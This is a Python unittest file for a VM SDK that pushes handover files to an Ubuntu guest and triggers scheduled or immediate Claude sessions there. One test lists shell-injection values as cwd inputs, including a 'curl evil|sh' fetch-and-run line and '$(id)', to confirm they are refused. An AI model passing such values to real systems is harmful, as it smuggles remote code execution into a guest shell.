class TestTriggerClaude(unittest.TestCase):
    def setUp(self):
        import tempfile
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(lambda: __import__("shutil").rmtree(self.tmp, ignore_errors=True))
        self.local = Path(self.tmp) / "next-session-1.md"
        self.local.write_text("# handover\n")

    def _vm(self):
        with mock.patch.dict(os.environ,
                             {"ubuntu_vm_user": "osboxes", "ubuntu_vm_pass": "pw"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                return vmsdk.VM("ubuntu_new")

    def _expected_remote(self, local, inbox="~/handover-inbox"):
        """Mirror trigger_claude's immutable collision-resistant inbox naming."""
        import hashlib
        src = Path(local).resolve()
        tag = hashlib.sha1(str(src).encode()).hexdigest()[:8]
        digest = hashlib.sha1(src.read_bytes()).hexdigest()[:8]
        return f"{inbox}/{tag}-{digest}-{src.name}"

    def test_immediate_drives_claude_with_guest_handover_path(self):
        vm = self._vm()
        guest = "/home/u/handover-inbox/next-session-1.md"
        with mock.patch.object(vm, "push_file", return_value=guest) as pf, \
             mock.patch.object(vm, "drive_claude", return_value=(0, "done")) as dc:
            rc, out = vm.trigger_claude(str(self.local))
        self.assertEqual((rc, out), (0, "done"))
        pf.assert_called_once_with(str(self.local),
                                   self._expected_remote(self.local),
                                   data=self.local.read_bytes(), skip_if_exists=True)
        prompt = dc.call_args[0][0]
        self.assertIn(guest, prompt)
        self.assertEqual(dc.call_args.kwargs.get("cwd"),
                         "~/Documents/github/himmel-private")

    def test_same_basename_different_sources_distinct_guest_paths(self):
        """codex-adv CR: next-session-N.md exists in many buckets — two
        different host handovers must never map to the same inbox path."""
        vm = self._vm()
        other_dir = Path(self.tmp) / "other-bucket"
        other_dir.mkdir()
        other = other_dir / self.local.name   # SAME basename, different source
        other.write_text("# other handover\n")
        remotes = []
        def fake_push(local, remote, **kw):
            remotes.append(remote)
            return f"/home/u/{remote.lstrip('~/')}"
        with mock.patch.object(vm, "push_file", side_effect=fake_push), \
             mock.patch.object(vm, "drive_claude", return_value=(0, "ok")):
            vm.trigger_claude(str(self.local))
            vm.trigger_claude(str(other))
        self.assertEqual(len(remotes), 2)
        self.assertNotEqual(remotes[0], remotes[1])
        for r in remotes:
            self.assertTrue(r.endswith(f"-{self.local.name}"))

    def test_edited_content_never_mutates_queued_delivery(self):
        """codex-adv CR round 2: a retry with EDITED content must target a NEW
        guest path — the file an already-armed job points at is immutable.
        Same content retries hit the same path (idempotent, byte-identical)."""
        vm = self._vm()
        remotes = []
        def fake_push(local, remote, **kw):
            remotes.append(remote)
            return f"/home/u/{remote.lstrip('~/')}"
        with mock.patch.object(vm, "push_file", side_effect=fake_push), \
             mock.patch.object(vm, "run", return_value=(0, "armed")):
            vm.trigger_claude(str(self.local), when="22:30")
            vm.trigger_claude(str(self.local), when="22:30")   # same content
            self.local.write_text("# handover EDITED\n")
            vm.trigger_claude(str(self.local), when="23:30")   # edited content
        self.assertEqual(remotes[0], remotes[1])       # idempotent retry
        self.assertNotEqual(remotes[0], remotes[2])    # edit -> new path

    def test_immediate_passes_timeout_and_cwd(self):
        vm = self._vm()
        with mock.patch.object(vm, "push_file", return_value="/h/x.md"), \
             mock.patch.object(vm, "drive_claude", return_value=(124, "Killed")) as dc:
            rc, out = vm.trigger_claude(str(self.local), cwd="~/himmel", timeout=42)
        self.assertEqual(rc, 124)  # timeout kill passes through, not raised
        self.assertEqual(dc.call_args.kwargs.get("timeout"), 42)
        self.assertEqual(dc.call_args.kwargs.get("cwd"), "~/himmel")

    def test_scheduled_arms_via_guest_arm_resume(self):
        vm = self._vm()
        cmds = []
        def fake_run(cmd, **kw):
            cmds.append(cmd)
            return (0, "armed")
        with mock.patch.object(vm, "push_file",
                               return_value="/home/u/handover-inbox/next-session-1.md"), \
             mock.patch.object(vm, "run", side_effect=fake_run):
            rc, out = vm.trigger_claude(str(self.local), when="22:30")
        self.assertEqual(rc, 0)
        joined = "\n".join(cmds)
        self.assertIn("arm-resume.sh", joined)          # never a hand-rolled scheduler
        self.assertIn("--time 22:30", joined)
        self.assertIn("--handover /home/u/handover-inbox/next-session-1.md", joined)
        # codex-adv CR: no --force — arm-resume's dedup/collision checks must
        # stay live so a re-trigger cannot silently replace a pending job.
        self.assertNotIn("--force", joined)

    def test_scheduled_without_cwd_omits_cwd_flag(self):
        """HIMMEL-835 CR finding 1: no explicit cwd -> --cwd must be ABSENT so
        arm-resume.sh's own priority (--cwd > resume_cwd: frontmatter >
        auto-detect) runs, instead of an implicit default silently overriding
        resume_cwd: / hard-failing a resume_worktree: handover (--cwd and
        --worktree are mutually exclusive in arm-resume.sh). The default
        checkout is still used to LOCATE arm-resume.sh (a separate concern)."""
        vm = self._vm()
        cmds = []
        def fake_run(cmd, **kw):
            cmds.append(cmd)
            return (0, "armed")
        with mock.patch.object(vm, "push_file",
                               return_value="/home/u/handover-inbox/next-session-1.md"), \
             mock.patch.object(vm, "run", side_effect=fake_run):
            vm.trigger_claude(str(self.local), when="22:30")
        joined = "\n".join(cmds)
        self.assertIn("cd ~/Documents/github/himmel-private", joined)
        self.assertNotIn("--cwd", joined)

    def test_scheduled_with_explicit_cwd_includes_cwd_flag(self):
        vm = self._vm()
        cmds = []
        def fake_run(cmd, **kw):
            cmds.append(cmd)
            return (0, "armed")
        with mock.patch.object(vm, "push_file",
                               return_value="/home/u/handover-inbox/next-session-1.md"), \
             mock.patch.object(vm, "run", side_effect=fake_run):
            vm.trigger_claude(str(self.local), when="22:30", cwd="~/himmel")
        joined = "\n".join(cmds)
        self.assertIn("cd ~/himmel", joined)
        self.assertIn("--cwd ~/himmel", joined)

    def test_scheduled_arm_failure_raises(self):
        vm = self._vm()
        with mock.patch.object(vm, "push_file", return_value="/h/x.md"), \
             mock.patch.object(vm, "run", return_value=(1, "at: no atd running")):
            with self.assertRaises(vmsdk.VMError) as cm:
                vm.trigger_claude(str(self.local), when="22:30")
        self.assertIn("arm-resume", str(cm.exception))

    def test_scheduled_arm_run_exception_wrapped_as_vmerror(self):
        """HIMMEL-835 CR finding 4: a raw exception from self.run (e.g. a
        socket timeout) during the arm-resume call must surface as a clean
        VMError, not a raw traceback from the new CLI verb."""
        vm = self._vm()
        with mock.patch.object(vm, "push_file", return_value="/h/x.md"), \
             mock.patch.object(vm, "run", side_effect=socket.timeout("timed out")):
            with self.assertRaises(vmsdk.VMError):
                vm.trigger_claude(str(self.local), when="22:30")

    def test_missing_handover_raises_vmerror_not_raw_exception(self):
        """HIMMEL-835 CR finding 3: Path(...).resolve() does not require
        existence — the hoisted is_file() check must raise a clean VMError
        before the digest read, not a raw FileNotFoundError, and push_file
        must never be reached."""
        vm = self._vm()
        missing = str(Path(self.tmp) / "absent.md")
        with mock.patch.object(vm, "push_file") as pf:
            with self.assertRaises(vmsdk.VMError) as cm:
                vm.trigger_claude(missing)
            pf.assert_not_called()
        self.assertIn("not found", str(cm.exception))

    def test_shell_metacharacters_in_cwd_refused(self):
        """cwd is interpolated unquoted into guest cd commands — charset-
        validate so a crafted cwd cannot inject guest commands."""
        vm = self._vm()
        for evil in ("~/repo; curl evil|sh", "$(id)", "~/a b"):
            with mock.patch.object(vm, "push_file") as pf, \
                 mock.patch.object(vm, "run") as r:
                with self.assertRaises(vmsdk.VMError):
                    vm.trigger_claude(str(self.local), cwd=evil)
                pf.assert_not_called()  # refused before the handover is pushed
                r.assert_not_called()


class TestTriggerCLI(unittest.TestCase):
    def _env(self):
        return mock.patch.dict(os.environ,
                               {"ubuntu_vm_user": "u", "ubuntu_vm_pass": "p"}, clear=False)

    def test_trigger_parses_at_cwd_timeout(self):
        with self._env(), mock.patch.object(vmsdk, "_load_dotenv_into_env"), \
             mock.patch.object(vmsdk.VM, "trigger_claude",
                               return_value=(0, "armed")) as t:
            rc = vmsdk.main(["ubuntu_new", "trigger", "h.md",
                             "--at", "22:30", "--cwd", "~/himmel", "--timeout", "60"])
        self.assertEqual(rc, 0)
        t.assert_called_once_with("h.md", when="22:30", cwd="~/himmel", timeout=60)

    def test_trigger_propagates_drive_rc(self):
        with self._env(), mock.patch.object(vmsdk, "_load_dotenv_into_env"), \
             mock.patch.object(vmsdk.VM, "trigger_claude", return_value=(124, "Killed")):
            rc = vmsdk.main(["ubuntu_new", "trigger", "h.md"])
        self.assertEqual(rc, 124)

    def test_trigger_unknown_flag_exit_2(self):
        with self._env(), mock.patch.object(vmsdk, "_load_dotenv_into_env"):
            rc = vmsdk.main(["ubuntu_new", "trigger", "h.md", "--bogus", "x"])
        self.assertEqual(rc, 2)

    def test_trigger_missing_flag_value_exit_2(self):
        with self._env(), mock.patch.object(vmsdk, "_load_dotenv_into_env"):
            rc = vmsdk.main(["ubuntu_new", "trigger", "h.md", "--at"])
        self.assertEqual(rc, 2)

    def test_trigger_environment_error_exit_1(self):
        with self._env(), mock.patch.object(vmsdk, "_load_dotenv_into_env"), \
             mock.patch.object(vmsdk.VM, "trigger_claude",
                               side_effect=EnvironmentError("claude not found on guest")):
            rc = vmsdk.main(["ubuntu_new", "trigger", "h.md"])
        self.assertEqual(rc, 1)

    def test_push_prints_absolute_remote(self):
        with self._env(), mock.patch.object(vmsdk, "_load_dotenv_into_env"), \
             mock.patch.object(vmsdk.VM, "push_file",
                               return_value="/home/u/handover-inbox/h.md") as p:
            rc = vmsdk.main(["ubuntu_new", "push", "h.md"])
        self.assertEqual(rc, 0)
        p.assert_called_once_with("h.md", "~/handover-inbox/h.md")


def _ubuntu_up():
    import socket as _s
    try:
        with _s.create_connection(("127.0.0.1", 2222), timeout=3):
            return True
    except OSError:
        return False


@unittest.skipUnless(_ubuntu_up(), "ubuntu_new not reachable on 127.0.0.1:2222")
class TestLiveUbuntu(unittest.TestCase):
    def test_up_run_echo(self):
        vm = vmsdk.VM("ubuntu_new")
        banner = vm.up()
        self.assertIn("SSH-", banner)
        rc, out = vm.run("echo hi")
        self.assertEqual(rc, 0)
        self.assertIn("hi", out)
        vm.close()

    def test_baseline_restore_fast_path(self):
        import vbox as _vbox
        snap = "vmsdk_test_tmp"
        vm = vmsdk.VM("ubuntu_new")
        vm.up()
        # Re-run tolerant: drop a leaked snapshot from a prior failed run first.
        if snap in vm.snapshots():
            _vbox._run("snapshot", "ubuntu_new", "delete", snap)
        vm.snapshot(snap)
        try:
            result = vm.baseline(snap)  # snapshot exists -> restore path
            self.assertEqual(result, "restored")
        finally:
            rc, out = _vbox._run("snapshot", "ubuntu_new", "delete", snap)
            vm.close()
            # Surface a cleanup failure instead of leaking the snapshot silently.
            self.assertEqual(rc, 0, f"snapshot cleanup failed: {out[-200:]}")


if __name__ == "__main__":
    unittest.main()
